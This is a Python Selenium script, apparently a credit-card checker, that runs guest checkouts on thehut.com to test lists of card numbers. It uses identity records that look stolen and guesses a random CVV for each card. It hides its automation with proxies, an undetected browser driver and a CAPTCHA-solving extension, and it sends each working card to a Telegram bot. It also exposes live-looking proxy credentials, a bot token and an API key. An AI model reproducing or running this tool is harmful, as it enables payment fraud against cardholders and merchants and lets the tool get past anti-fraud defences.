from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time
import undetected_chromedriver as uc 
import urllib.request
from fake_useragent import UserAgent
import re
import os
import threading
import random
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import shutil
import requests

proxy_list = [f"p.webshare.io:{i}" for i in range(10010, 10099)]
proxy_host = "gate.dc.smartproxy.com"
proxy_port = "20000"
proxy_username = "sp72951518"
proxy_password = "121299vnN___"
proxy_port = int(proxy_port)
items_url = "https://www.thehut.com/accessories/dr.-martens-double-dock-cotton-blend-socks/15225853.html"
#PROXY = random.choice(proxy_list)
PROXY = "127.0.0.1:60000"
TelegramURL = "https://api.telegram.org/bot6996206278:AAGbcKl4naldDIFSr2M1fFIxeviB0E1zFc8/sendMessage?chat_id=-4287406594&text="

RunPath = r'C:\Users\SV-1\Documents\CC Checker'
profile = "Profile 1"
ccFile = RunPath + r'\CCN_4.txt'
ccLive = RunPath + r'\CCLIVE.txt'
#ccInfor = RunPath + r'\CCINFO.txt'
info = RunPath + r'\inforboibest.txt'
extension_path = r'C:\Users\SV-1\GPM\pythonProject2\ProfileChimto\Default\Extensions\dknlfmjaanfblgfdfebhijalfmhmjjjo\0.4.12_0'
dLive = []
i=0

random_names = [
    "Alex", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Jamie", "Avery", "Parker", "Quinn",
    "Avery", "Bailey", "Cameron", "Dakota", "Eden", "Emerson", "Finley", "Harper", "Imani", "Jaden",
    "Kieran", "Lennon", "Marley", "Nico", "Oakley", "Phoenix", "Quinn", "Reagan", "Rowan", "Sage",
    "Teagan", "Uriel", "Valley", "Winter", "Xander", "Yara", "Zane", "Ashton", "Blake", "Casey",
    "Drew", "Ellis", "Fallon", "Grey", "Harlow", "Indie", "Jules", "Kasey", "Lane", "Mavery",
    "Navy", "Orion", "Pax", "Quinn", "Reese", "Sterling", "Tanner", "Ursa", "Vesper", "West"
]
random_name = random.choice(random_names)
random_name_1 = random.choice(random_names)

if __name__ == '__main__':      

    with open(info, 'r') as file:
        linesadd = file.readlines()

    with open(ccFile, 'r') as f:
        data = f.read().splitlines()
    dataWrite = data.copy() 
    with open(ccLive, 'r') as f:
        dLive = f.read().splitlines()

    checkerror = True 
    def Replace(xInput):        
        return xInput.replace(" ","")
    
    def checkExists(driver, xpath):
        try:
            driver.find_element(By.XPATH, xpath) 
        except NoSuchElementException:
            return False
        return True
    def Search(sText,inText):
        try:            
            text_found = re.search(sText, inText)             
            if text_found != None:
                 return True
        except NoSuchElementException:
            return False
        return False   
    def checkExistss(driver, by, value):
        try:
            driver.find_element(by, value)
            return True
        except:
            return False
    class ProxyExtension:
        def __init__(self, host, port, username, password):
            self.manifest_json = """
            {
                "version": "1.0.0",
                "manifest_version": 2,
                "name": "Chrome Proxy",
                "permissions": [
                    "proxy",
                    "tabs",
                    "unlimitedStorage",
                    "storage",
                    "<all_urls>",
                    "webRequest",
                    "webRequestBlocking"
                ],
                "background": {"scripts": ["background.js"]},
                "minimum_chrome_version": "76.0.0"
            }
            """
            self.background_js = """
            var config = {
                mode: "fixed_servers",
                rules: {
                    singleProxy: {
                        scheme: "http",
                        host: "%s",
                        port: %d
                    },
                    bypassList: ["localhost"]
                }
            };

            chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

            function callbackFn(details) {
                return {
                    authCredentials: {
                        username: "%s",
                        password: "%s"
                    }
                };
            }

            chrome.webRequest.onAuthRequired.addListener(
                callbackFn,
                { urls: ["<all_urls>"] },
                ['blocking']
            );
            """ % (host, port, username, password)

        def create_extension(self, extension_dir):
            import os
            import json

            if not os.path.exists(extension_dir):
                os.makedirs(extension_dir)

            with open(os.path.join(extension_dir, 'manifest.json'), 'w') as f:
                f.write(self.manifest_json)

            with open(os.path.join(extension_dir, 'background.js'), 'w') as f:
                f.write(self.background_js)



    proxy_extension = ProxyExtension(proxy_host, proxy_port, proxy_username, proxy_password)
    extension_dir = os.path.join(os.getcwd(), 'proxy_extension')
    proxy_extension.create_extension(extension_dir)
    def my_function():
        new_profile_dir = os.path.join(os.getcwd(), f'profile_{int(time.time())}')
        ua = UserAgent()
        #user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        extension_path_1 = extension_dir
        extension_path_2 = extension_path
        extensions = f"{extension_path_1},{extension_path_2}"
        user_agent = ua.random
        chrome_options = Options()
        #chrome_options.add_argument("--load-extension=" + extension_path)
        chrome_options.add_argument("--load-extension=" + extensions)
        #chrome_options.add_argument(f'--user-agent={user_agent}')
        chrome_options.add_argument("--disable-popup-blocking")
        chrome_options.add_argument("--disable-notifications")
        chrome_options.add_argument("--enable-javascript")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")   
        chrome_options.add_argument(f'--user-data-dir={new_profile_dir}')
        chrome_options.add_argument('--proxy-server=' + PROXY)
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--force-device-scale-factor=0.7")
        
        time.sleep(2)
        global i

        print('Running')                
        driver = uc.Chrome(options=chrome_options) 
        driver.set_window_size(900, 1200)
        action = webdriver.ActionChains(driver) 
        #add nopecha
        driver.get("chrome-extension://dknlfmjaanfblgfdfebhijalfmhmjjjo/popup.html")

        time.sleep(2.5)
        element = WebDriverWait(driver, 60).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, ".key-icon.font-normal.color-brand"))
        )
        driver.execute_script("document.querySelector('.key-icon.font-normal.color-brand').click();")
        time.sleep(0.5)
        input_element = driver.find_element(By.CLASS_NAME, "key-input")
        input_element.send_keys("sub_1PgTA6CRwBwvt6ptxyWgPXTt") 
        input_element.send_keys(Keys.ENTER)
        time.sleep(2.5)
        #add cart & guest check out
        driver.get(items_url)
        time.sleep(5) 
        driver.execute_script("""
            var button = document.querySelector('button[aria-label="Add to Basket"]');
            // Kiểm tra xem thẻ button có tồn tại không
            if (button) {
            // Thực hiện click vào thẻ button
            button.click();
            } else {
            console.log('Button not found');
            }
            """)
        time.sleep(12)
        driver.get("https://www.thehut.com/my.basket")
        time.sleep(9)
        driver.execute_script("""
            var xpath = '//*[@id="mainContent"]/div[3]/div[3]/div[3]/div[2]/form/button';

            var xpathResult = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);

            var button = xpathResult.singleNodeValue;

            if (button) {
            button.click();
            } else {
            console.log('Button not found');
            }

            """)

        lineadd = random.choice(linesadd).strip()
        random_digits = random.randint(1000, 99999)
        #nhap info check guest
        fname = lineadd.split("|")[0]
        lname = lineadd.split("|")[1]
        phone = lineadd.split("|")[2]
        #email = lineadd.split("|")[3]
        address = lineadd.split("|")[4]
        city = lineadd.split("|")[5]
        state = lineadd.split("|")[6]
        zipcode = lineadd.split("|")[7]
        fullname = fname + " " + random_name + " " + lname
        email = f"{fname}{random_digits}@hotmail.com"

        #register account
        email_input = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, '(//input[@name="Email address"])[2]'))
        )
        time.sleep(5.5)
        #email_input.click()
        email_input.clear()
        email_input.send_keys(email)
        time.sleep(1.5)
        driver.execute_script("""
            var button = document.querySelector('button[aria-label="Continue as guest"]');
            if (button) {
                button.click();
            } else {
                console.log('Button not found');
            }
        """)
        recaptcha_iframe = WebDriverWait(driver, 25).until(
                        EC.presence_of_element_located((By.XPATH, '//iframe[@title="reCAPTCHA"]'))
                    )
        driver.switch_to.frame(recaptcha_iframe)
        time.sleep(1.5)
        driver.switch_to.default_content()
        done_email = WebDriverWait(driver, 160).until(
                        EC.presence_of_element_located((By.XPATH, "//button[@data-testid='button-submit-guest-checkout-yes']"))
                    )
        time.sleep(1.9)
        done_email.click()
        time.sleep(2.9)
        wait = WebDriverWait(driver, 160)
        iCountry = wait.until(EC.presence_of_element_located((By.ID, 'delivery-country')))
        iCountry = driver.find_element(By.ID, 'delivery-country')
        iCountry.click()
        time.sleep(0.5)  # Đợi một chút cho combobox hiện ra
        iCountry.send_keys("United States")
        time.sleep(0.5)
        us_option = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//option[@value='US']"))
        )
        us_option.click()
        time.sleep(5.5)
        input_fname = wait.until(EC.presence_of_element_located((By.ID, 'delivery-addressee'))) 
        input_fname.click()
        input_fname.clear()
        input_fname.send_keys(fullname)
        time.sleep(0.5)

        iaddress = driver.find_element(By.ID, 'delivery-street-name')
        iaddress.click()
        iaddress.clear()
        iaddress.send_keys(address)
        time.sleep(0.5)

        icity = driver.find_element(By.ID, 'delivery-town-city')
        icity.click()
        icity.clear()
        icity.send_keys(city)
        time.sleep(0.5)

        istate = driver.find_element(By.ID, 'delivery-state-province')
        istate.click()
        time.sleep(0.5)
        istate.send_keys(state)
        istate_option = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, f"//option[text()='PA - Pennsylvania']"))
        )
        istate_option.click()
        time.sleep(0.5)


        izipcode = driver.find_element(By.ID, 'delivery-post-zip-code')
        izipcode.click()
        izipcode.clear()
        izipcode.send_keys(zipcode)
        time.sleep(0.5)

        iphone = driver.find_element(By.ID, 'InputField--deliveryAddress.contactNumber')
        iphone.click()
        iphone.clear()
        iphone.send_keys(phone)
        time.sleep(0.5)
        
        

        Track_delivery = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-test="DeliveryOptionShipmentContents__priceLine"]')))

        check = True
        while True:
            action = ActionChains(driver)
            while i < len(data) :  
                try:

                    line = data[i]           
                    card_number = line.split("|")[0]
                    exp_month = line.split("|")[1]
                    exp_year = line.split("|")[2]
                    #card_ccv = line.split("|")[3]
                    card_ccv = "{:03d}".format(random.randint(0, 999))
                    exp_month_last_two = exp_month[-2:]
                    exp_year_last_two = exp_year[-2:]
                    fullexp = exp_month_last_two + exp_year_last_two
                    fullcardname = fullname + " " + random_name_1
                    time.sleep(1)
                    # Nhập thông tin thẻ
                    #card
                    iCardNumber = driver.find_element(By.ID, "credit-card-num")
                    iCardNumber.click()
                    iCardNumber.clear()
                    for char in card_number:
                        iCardNumber.send_keys(char)
                        time.sleep(0.1)
                    time.sleep(2)
                    iCardName = driver.find_element(By.ID, "credit-card-name-on-card")
                    iCardName.click()
                    iCardName.clear()
                    current_value = iCardName.get_attribute('value')
                    for _ in range(len(current_value)):
                        iCardName.send_keys(Keys.BACKSPACE)
                    time.sleep(1)

                    for char in fullcardname:
                        iCardName.send_keys(char)
                        time.sleep(0.1)
                    time.sleep(2)

                    # Nhập ngày hết hạn
                    iCardexp = driver.find_element(By.ID, "credit-card-expiry-date")
                    iCardexp.click()
                    iCardexp.clear()
                    for char in fullexp:
                        iCardexp.send_keys(char)
                        time.sleep(0.1)
                    time.sleep(2)
                    # Nhập CCV
                    iCardCCV = driver.find_element(By.ID, "credit-card-cv2")
                    iCardCCV.click()
                    iCardCCV.clear()
                    for char in card_ccv:
                        iCardCCV.send_keys(char)
                        time.sleep(0.1)
                    time.sleep(2)
                    #end card

                    #click submit my order
                    driver.execute_script("document.getElementById('SubmitButton').click();")
                    print("Checking : [" + str(i+1) + "/" + str(len(data)) + "] ", line)

                    time.sleep(30)

                    check = True                     
                    while check :
                        try : 
                            try : 
                                
                                #order = driver.find_element(By.CLASS_NAME, "Header_content__VVavC")
                                order = driver.find_element(By.XPATH, "//span[contains(text(), \"Thank you for your order\")]")
                                urllib.request.urlopen(TelegramURL + line).read()
                                print("LIVE : [" + str(i+1) + "/" + str(len(data)) + "] ", line) 
                                dLive.append(line)
                                try:
                                    dataWrite.remove(line)
                                except:
                                    time.sleep(1) 
                                driver.quit()
                                if os.path.exists(new_profile_dir):
                                    shutil.rmtree(new_profile_dir)
                                i+=1
                                return my_function()
                                check = False
                                break
                                
                            except:   
                                if checkExists(driver, "//div[contains(text(), 'Sorry, we were unable to place your order. Please try again.')]"):
                                    try:
                                        dataWrite.remove(line)
                                    except:
                                        time.sleep(1)
                                    print("Die : [" + str(i+1) + "/" + str(len(data)) + "] ", line) 
                                    driver.refresh()
                                    i+=1
                                    break
                                else : 
                                    try:
                                        driver.quit()
                                        if os.path.exists(new_profile_dir):
                                            shutil.rmtree(new_profile_dir)                  
                                        return my_function()
                                        #WebDriverWait(driver, 15).until(EC.title_contains("Checkout"))
                                    except:
                                        try :
                                            driver.quit()
                                            if os.path.exists(new_profile_dir):
                                                shutil.rmtree(new_profile_dir) 
                                            i+=1 
                                            return my_function()  
                                                                                        
                                        except:
                                            time.sleep(1)   
                                    break
                            
                        except:   
                            time.sleep(5)
                        break
                  
                    try:
                        with open(ccFile, 'w') as file:
                            file.writelines(s + '\n' for s in dataWrite)                            
                    except:
                        time.sleep(5) 
                    try:
                        with open(ccLive, 'w') as file:
                            file.writelines(s + '\n' for s in dLive)                            
                    except:
                        time.sleep(5) 
                    
                except:   
                    driver.quit()
                    if os.path.exists(new_profile_dir):
                        shutil.rmtree(new_profile_dir)                     
                    return my_function() 
                break
                    
    value = None

my_function()()
